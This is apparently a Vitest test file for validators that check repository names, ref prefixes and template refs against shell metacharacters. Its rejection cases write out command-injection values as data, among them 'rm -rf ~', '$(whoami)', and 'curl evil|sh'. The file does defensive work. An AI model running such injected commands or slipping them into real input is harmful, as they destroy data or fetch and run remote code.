import { describe, expect, it } from 'vitest';

import { validatePrefix, validateRepo, validateTemplateRef } from './validate';

describe('validateRepo', () => {
  it('accepts owner/name', () => {
    expect(validateRepo('AgentEnder/design-drafts').ok).toBe(true);
    expect(validateRepo('a/b.c_d-e').ok).toBe(true);
  });

  it('rejects empty, missing slash, and shell metacharacters', () => {
    expect(validateRepo('').ok).toBe(false);
    expect(validateRepo('nodash').ok).toBe(false);
    expect(validateRepo('foo/bar; rm -rf ~').ok).toBe(false);
    expect(validateRepo('foo/$(whoami)').ok).toBe(false);
    expect(validateRepo('foo/bar baz').ok).toBe(false);
    expect(validateRepo('foo/`id`').ok).toBe(false);
  });
});

describe('validatePrefix', () => {
  it('accepts ref-safe prefixes including empty', () => {
    expect(validatePrefix('drafts/').ok).toBe(true);
    expect(validatePrefix('').ok).toBe(true);
    expect(validatePrefix('team-a/previews/').ok).toBe(true);
  });

  it('rejects shell metacharacters', () => {
    expect(validatePrefix('x; curl evil|sh ').ok).toBe(false);
    expect(validatePrefix('$(touch pwned)').ok).toBe(false);
  });
});

describe('validateTemplateRef', () => {
  it('accepts branches, tags, and shas', () => {
    expect(validateTemplateRef('main').ok).toBe(true);
    expect(validateTemplateRef('v1.2.3').ok).toBe(true);
    expect(validateTemplateRef('feature/x').ok).toBe(true);
  });

  it('rejects empty and metacharacters', () => {
    expect(validateTemplateRef('').ok).toBe(false);
    expect(validateTemplateRef('main; echo hi').ok).toBe(false);
  });
});
